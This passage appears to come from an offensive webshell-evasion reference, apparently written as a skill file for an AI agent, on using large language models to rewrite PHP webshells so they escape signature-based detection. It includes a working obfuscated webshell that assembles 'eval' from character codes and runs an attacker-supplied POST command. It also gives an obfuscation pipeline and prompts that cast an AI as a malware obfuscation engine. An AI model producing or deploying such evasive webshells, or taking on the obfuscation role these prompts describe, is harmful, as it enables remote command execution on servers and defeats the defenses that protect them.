### 4.1 AI-Generated WebShell Mutation

Use large language models to generate semantically equivalent but syntactically different variants of WebShells, defeating signature-based detection.

**Mutation strategy using AI:**

```
PROMPT: "Rewrite the following PHP code to have the same functionality but
use completely different control flow, variable names, and function call
patterns. Add dead code, random comments, and meaningless conditional
branches. The output must still execute the same shell command."

INPUT: eval($_POST['cmd']);
OUTPUT (AI-generated variant):
  $config = parse_ini_string(base64_decode($_SERVER['HTTP_X_CONFIG'] ?? ''));
  $action = $config['log_level'] ?? 'debug';
  if ($action === 'debug') {
      $logger = function($msg) { file_put_contents('/tmp/app.log', $msg, FILE_APPEND); };
      $logger('Processing request');
  }
  $handler = $_POST['action'] ?? null;
  if ($handler && strlen($handler) > 0) {
      $processor = function($data) {
          $f = [chr(101), chr(118), chr(97), chr(108)];
          return $f[0] . $f[1] . $f[2] . $f[3];
      };
      $exec = $processor(null);
      $exec($_POST['cmd']);
  }
```

### 4.2 LLM-Based WebShell Obfuscator

A systematic approach to using LLMs for WebShell code transformation.

**Obfuscation pipeline:**

```
Step 1: Input WebShell code
Step 2: LLM parses the AST (Abstract Syntax Tree)
Step 3: Transformations applied:
  - Variable renaming using LLM-generated semantic names
  - Dead code injection (LLM generates plausible dead code)
  - Control flow flattening (LLM rewrites as switch-case)
  - String encryption (LLM chooses encoding scheme)
  - Comment injection (LLM generates realistic comments)
Step 4: Output obfuscated WebShell
Step 5: Verify functional equivalence
```

**LLM prompt engineering for obfuscation:**

```
SYSTEM: You are a code obfuscation engine. Your task is to transform
PHP code while preserving exact functionality. Apply these rules:
1. Rename all variables to random 8-character strings
2. Replace all string literals with chr() concatenation
3. Add 3 dead code blocks that look like legitimate business logic
4. Replace direct function calls with variable functions
5. Add realistic PHP comments in English
6. Wrap the entire code in a try-catch block
7. Output ONLY the transformed code, no explanations
```



---
📖 本切片 1/3 结束。 续篇: `skill_view(name="webshell-evasion", file_path="references/chapter-04-2026-latest-evasion-techniques-02.md")`